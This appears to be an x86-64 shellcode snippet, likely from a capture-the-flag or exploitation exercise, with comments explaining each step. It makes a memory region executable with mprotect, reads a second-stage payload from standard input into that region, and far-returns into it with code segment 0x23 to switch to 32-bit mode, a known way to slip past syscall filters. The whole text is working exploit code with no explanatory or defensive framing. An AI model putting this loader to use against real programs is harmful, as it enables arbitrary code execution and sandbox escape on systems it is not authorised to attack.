xor rax, rax
mov al, 9
inc al
mov rdi, 0x602000
mov rsi, 0x1000
mov rdx, 7
syscall 
; mprotect(0x602000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)

mov rax, 0
xor rdi, rdi
mov rsi, 0x602190
mov rdx, 27
syscall
; read(0, 0x602190, 27)

xor rsp, rsp
mov esp, 0x602160
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602190
retf
; ret to 0x602190, cs:0x23 = 32-bit mode